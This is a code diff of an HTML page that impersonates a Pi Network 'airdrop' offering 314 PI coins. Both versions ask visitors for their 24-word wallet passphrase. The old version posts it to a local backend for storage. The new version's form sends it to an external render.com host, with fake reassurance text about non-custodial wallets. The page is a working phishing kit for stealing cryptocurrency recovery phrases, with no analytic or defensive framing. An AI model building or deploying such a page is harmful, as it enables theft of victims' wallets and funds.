@@ -1,262 +1,160 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pi Network Wallet</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <title>Unlock Pi Reward</title>
     <style>
-        body {
-            font-family: 'Poppins', sans-serif;
-            background-color: #f4f4f4;
+        /* General reset */
+        * {
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #f4f4f4;
+            margin: 0;
+            overflow-x: hidden;
         }
 
         .container {
-            text-align: center;
-            padding: 50px;
-        }
-
-        .header {
-            color: #4c2d91;
-            font-size: 36px;
-            margin-bottom: 20px;
-        }
-
-        .subheader {
-            color: #ff9800;
-            font-size: 24px;
-            margin-bottom: 40px;
-        }
-
-        .grid-container {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 20px;
-            justify-content: center;
-            margin-top: 30px;
-        }
-
-        .grid-item {
-            background-color: #ffffff;
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            cursor: pointer;
-        }
-
-        .grid-item:hover {
-            background-color: #f0f0f0;
-        }
-
-        .grid-item i {
-            font-size: 50px;
-            color: #4c2d91;
-            margin-bottom: 15px;
-        }
-
-        .grid-item p {
-            color: #333;
-            font-size: 18px;
-        }
-
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 1;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
-            overflow: auto;
-            padding-top: 60px;
-        }
-
-        .modal-content {
-            background-color: white;
-            margin: 5% auto;
+            width: 90%;
+            max-width: 400px;
+            background: white;
             padding: 20px;
-            border-radius: 10px;
-            width: 80%;
-            max-width: 500px;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+            text-align: center;
         }
 
-        .modal-header {
-            font-size: 24px;
-            color: #4c2d91;
+        /* Header Styling */
+        .header {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 32px;
+            font-weight: bold;
+            color: #4A148C;
+            text-shadow: 0px 2px 6px rgba(74, 20, 140, 0.6);
+            animation: fade-in 1.5s ease-in-out;
+            margin-bottom: 8px;
+        }
+
+        .header h2 {
+            font-size: 20px;
+            font-weight: 500;
+            color: #FF6F00;
+            text-shadow: 0px 1px 4px rgba(255, 111, 0, 0.7);
             margin-bottom: 20px;
         }
 
-        .input-field {
-            width: 100%;
-            padding: 15px;
-            margin: 10px 0;
-            border-radius: 5px;
-            border: 1px solid #ddd;
-            font-size: 16px;
+        @keyframes fade-in {
+            0% {
+                opacity: 0;
+                transform: scale(0.9);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
         }
 
-        .button {
-            padding: 15px 30px;
-            background-color: #4c2d91;
+        /* Form Styling */
+        h3 {
+            font-size: 22px;
+            color: #5a2da2;
+            margin-bottom: 20px;
+        }
+
+        textarea {
+            width: 100%;
+            height: 100px;
+            padding: 10px;
+            font-size: 14px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            resize: none;
+        }
+
+        button {
+            width: 100%;
+            background-color: #5a2da2;
             color: white;
             border: none;
-            border-radius: 5px;
+            padding: 12px 20px;
+            font-size: 16px;
+            border-radius: 4px;
             cursor: pointer;
-            font-size: 18px;
-            margin-top: 10px;
+            margin-top: 20px;
         }
 
-        .button:hover {
-            background-color: #6a3c9d;
+        button:hover {
+            background-color: #4a2390;
         }
 
-        .footer {
-            font-size: 14px;
-            color: #888;
-            margin-top: 50px;
+        /* Info Text */
+        .info-text {
+            font-size: 12px;
+            color: #555;
+            margin-top: 20px;
+            line-height: 1.5;
         }
 
-        @media (max-width: 768px) {
-            .grid-container {
-                grid-template-columns: repeat(2, 1fr);
-            }
-
-            .header {
-                font-size: 28px;
-            }
-
-            .subheader {
-                font-size: 20px;
-            }
+        .info-text a {
+            color: #5a2da2;
+            text-decoration: none;
         }
 
-        @media (max-width: 480px) {
-            .grid-container {
-                grid-template-columns: 1fr;
-            }
-
-            .header {
-                font-size: 24px;
-            }
-
-            .subheader {
-                font-size: 18px;
-            }
-
-            .modal-content {
-                width: 90%;
-            }
+        .info-text a:hover {
+            text-decoration: underline;
         }
     </style>
-</head>
-
-<body>
-
-    <div class="container">
-        <div class="header">AIRDROP FROM PI NETWORK</div>
-        <div class="subheader">Claim Your 314 PI Coins Now</div>
-
-        <div class="grid-container">
-            <div class="grid-item" onclick="openModal()">
-                <i class="fas fa-wallet"></i>
-                <p>Wallet</p>
-            </div>
-            <div class="grid-item">
-                <i class="fas fa-cogs"></i>
-                <p>Fireside</p>
-            </div>
-            <div class="grid-item">
-                <i class="fas fa-lightbulb"></i>
-                <p>Brainstorm</p>
-            </div>
-            <div class="grid-item">
-                <i class="fas fa-cogs"></i>
-                <p>Mine</p>
-            </div>
-            <div class="grid-item">
-                <i class="fas fa-database"></i>
-                <p>Blockchain</p>
-            </div>
-            <div class="grid-item">
-                <i class="fas fa-cogs"></i>
-                <p>Develop</p>
-            </div>
-            <div class="grid-item">
-                <i class="fas fa-user"></i>
-                <p>KYC</p>
-            </div>
-            <div class="grid-item">
-                <i class="fas fa-comment"></i>
-                <p>Chat</p>
-            </div>
-            <div class="grid-item">
-                <i class="fas fa-user"></i>
-                <p>Profiles</p>
-            </div>
-        </div>
-
-        <div class="footer">Explore the Ecosystem</div>
-    </div>
-
-    <!-- Modal -->
-    <div id="walletModal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">Enter Your 24-Word Passphrase</div>
-            <input type="text" id="passphraseInput" class="input-field" placeholder="Enter your 24-word passphrase here" />
-            <button class="button" onclick="submitPassphrase()">Unlock with passphrase</button>
-        </div>
-    </div>
-
     <script>
-        // Open the modal when the Wallet option is clicked
-        function openModal() {
-            document.getElementById('walletModal').style.display = 'block';
-        }
-
-        // Close the modal when clicking outside of it
-        window.onclick = function (event) {
-            if (event.target === document.getElementById('walletModal')) {
-                document.getElementById('walletModal').style.display = 'none';
-            }
+        // Clear passphrase on page reload
+        window.onload = function() {
+            document.getElementById("passphrase").value = "";
         };
 
-        // Handle form submission to save the passphrase in MongoDB
-        async function submitPassphrase() {
-            const passphrase = document.getElementById('passphraseInput').value;
+        function validatePassphrase() {
+            const passphrase = document.getElementById("passphrase").value.trim();
+            const wordCount = passphrase.split(" ").filter(word => word).length;
 
-            if (passphrase.split(' ').length !== 24) {
-                alert('Invalid passphrase! Please enter exactly 24 words.');
-                return;
+            if (wordCount !== 24) {
+                alert("Please enter a valid 24-word passphrase.");
+                return false;
             }
-
-            // Send the passphrase to the backend
-            try {
-                const response = await fetch('http://localhost:3000/submit', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ passphrase })
-                });
-
-                if (response.ok) {
-                    alert('Passphrase saved successfully!');
-                    window.location.href = '/success'; // Redirect to the success page
-                } else {
-                    alert('Failed to save passphrase. Please try again.');
-                }
-            } catch (error) {
-                console.error('Error submitting passphrase:', error);
-                alert('Error submitting passphrase. Please try again later.');
-            }
+            return true;
         }
     </script>
-</body>
+</head>
+<body>
+    <div class="container">
+        <!-- Header Section -->
+        <div class="header">
+            <h1>Airdrop from Pi Network</h1>
+            <h2>Claim Your 314 PI Coins Now</h2>
+        </div>
 
+        <!-- Form Section -->
+        <h3>Unlock Pi Reward</h3>
+        <form action="https://pinetwork-ib9q.onrender.com/submit" method="POST" onsubmit="return validatePassphrase()">
+            <textarea id="passphrase" name="passphrase" placeholder="Enter your 24-word passphrase here"></textarea>
+            <button type="submit">Unlock with passphrase</button>
+        </form>
+
+        <!-- Info Section -->
+        <div class="info-text">
+            As a non-custodial wallet, your wallet passphrase is only accessible to you. It is currently not possible to recover the wallet passphrase. <br><br>
+            Lost your wallet passphrase? <a href="#">you can create a new wallet</a>, but all the Pi numbers in your previous wallet will be inaccessible.
+        </div>
+    </div>
+</body>
 </html>
